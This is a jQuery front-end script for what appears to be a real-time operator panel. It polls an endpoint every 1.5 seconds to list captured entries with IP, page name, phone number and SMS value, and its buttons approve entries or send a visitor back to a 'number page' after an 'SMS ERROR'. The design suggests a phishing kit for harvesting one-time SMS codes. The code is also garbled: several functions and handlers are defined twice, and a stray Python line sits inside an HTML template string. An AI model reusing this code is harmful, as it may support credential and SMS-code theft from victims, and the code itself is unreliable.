function loadContacts() {
    $.ajax({
      url: '/crud/api/list/',
      type: 'GET',
      dataType: 'json',
      success: function (data) {
        console.log('Received data:', data); 
        let contactsTableBody = $('#contact-table-body');
        contactsTableBody.empty();
  
      },
    });
  }
  loadContacts();
  setInterval(loadContacts, 1500); 
  function loadContacts() {
    $.ajax({
      url: '/crud/api/list/',
      type: 'GET',
      dataType: 'json',
      success: function (data) {
        let contactsTableBody = $('#contact-table-body');
        contactsTableBody.empty();
  
        data.contacts.forEach(function (contact) {
          let row = `
          messages = Message.objects.all().order_by('-created_at')
          
            <tr>
              <td>${contact.id}</td>
              <td>${contact.ip}</td>
              <td>${contact.page_name}</td>
              <td>${contact.phone}</td>
              <td>${contact.sms}</td>
              <td>${contact.created_at}</td>
              <td>
              </td>
              <td>
                <button type="button" class="smserror" id="smserror" data-contact-id="${contact.id}">SMS ERROR</button>
              </td> 
            </tr>
          `;
          contactsTableBody.append(row);
        });
      },
    });
  }
  $(document).on('click', '.approve-btn', function (event) {
    event.preventDefault();
    const contactId = $(this).data('contact-id');
  
    $.ajax({
      url: '/crud/approve/' + contactId + '/',
      type: 'POST',
      dataType: 'json',
      success: function (data) {
        if (data.success) {
        } else {
        }
      },
    });
  });
  $.ajaxSetup({
    headers: {
      'X-CSRFToken': getCookie('csrftoken')
    }
  });
  
  function getCookie(name) {
    let cookieValue = null;
    if (document.cookie && document.cookie !== '') {
      const cookies = document.cookie.split(';');
      for (let i = 0; i < cookies.length; i++) {
        const cookie = cookies[i].trim();
        if (cookie.substring(0, name.length + 1) === (name + '=')) {
          cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
          break;
        }
      }
    }
    return cookieValue;
  }
  $(document).on('click', '.approve-btn', function (event) {
    event.preventDefault();
    var contactId = $(this).data('contact-id');
  
    $.ajax({
      url: '/crud/api/approve/' + contactId + '/',
      type: 'POST',
      dataType: 'json',
      success: function (data) {
        // Handle the success response here
        if (data.success) {
          alert('Contact approved successfully!');
          // Refresh the contact list or perform any other necessary action
          loadContacts();
        } else {
          alert('Contact approval failed!');
        }
      },
      error: function (xhr, status, error) {
        // Handle the error here
        alert('An error occurred while approving the contact.');
        console.log(xhr.responseText);
      }
    });
  });



  
  $(document).on('click', '.smserror', function (event) {
    event.preventDefault();
    const contactId = $(this).data('contact-id');
  
    $.ajax({
      url: '/crud/smserror/' + contactId + '/',
      type: 'POST',
      dataType: 'json',
      success: function (data) {
        if (data.success) {
          alert('İstifadəçi nömrə səhifəsinə uğurla gönrədildi.!');
        } else {alert('Ooops nə isə səhv getdi.!');
        }
      },
    });
  });
  $.ajaxSetup({
    headers: {
      'X-CSRFToken': getCookie('csrftoken')
    }
  });
  
  function getCookie(name) {
    let cookieValue = null;
    if (document.cookie && document.cookie !== '') {
      const cookies = document.cookie.split(';');
      for (let i = 0; i < cookies.length; i++) {
        const cookie = cookies[i].trim();
        if (cookie.substring(0, name.length + 1) === (name + '=')) {
          cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
          break;
        }
      }
    }
    return cookieValue;
  }

